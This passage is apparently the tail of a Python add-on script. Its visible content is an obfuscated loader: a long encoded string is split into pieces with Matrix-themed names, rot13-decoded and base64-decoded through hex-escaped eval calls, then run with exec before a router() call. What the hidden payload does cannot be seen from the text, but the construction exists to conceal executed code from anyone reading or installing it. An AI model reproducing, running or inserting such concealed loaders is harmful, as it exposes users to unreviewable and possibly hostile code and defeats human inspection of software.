TEypJZ4FKqhnGH3pzHepGSLGT90oJL5Mv83ZHfiYmD2ZFg6AwMQITybov9Epl9EX1ymqGIAZzu2ZmuiE1pmX0qIL3Ounl8jBHAeBJucBRqcp1yfAv94JTymLv9OD2HmHF9womOyY2gAYmqiGSE1Yl9QD3ZinJtinGV3DzH3BTL1M3SdoGLepF8iIQZiY3MPBRcPraELrH0jpGx1nJyKnKSEFSuUHxZiD3plp2x4Y2yHJTpiLHAwImIZnFguJSyBBRZ5F2EIMmIloQH2BHcTIv91BFgnZz9xY2HeLv9PM3A6Iyy2FRqYFlfiraZ1nF83AaZioGyyJGEkpT8iGaAXpl9xE2xiJRq1Y0j5Yl9bpF8epxZiY0qcXmAdIRfiY2SInF9en1IzASZip24iGycDpR5BIw0aQDc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWj0XozIiVQ0tMKMuoPtaKUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzEprQMzKUt3Zyk4AmOprQL4KUt2AIk4AmIprQpmKUtlBIk4ZwOprQWSKUt2ASk4AwIprQLmKUt2Eyk4AwEprQL1KUtlBSk4ZwxaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt3ASk4AmWprQL5KUt2MIk4AwyprQp0KUt3BIk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXFNeVTI2LJjbW1k4AwWprQL5KUt2MIk4AwSprQpmKUt2Z1k4AwyprQL5KUtlMIk4AmIprQMyKUt2BSk4AwIprQp4KUt2L1k4AwyprQL2KUt3BIk4ZwuprQMzKUt3Zyk4AwSprQLmKUt2L1k4AwIprQV5KUtlEIk4AwEprQL1KUt2Z1k4AxMprQL0KUt2AIk4ZwuprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXD0XMKMuoPuwo21jnJkyXUcfnJVhMTIwo21jpzImpluvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AzIprQL1KUt2MvpcXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

if __name__ == '__main__':
    router(sys.argv[2][1:])
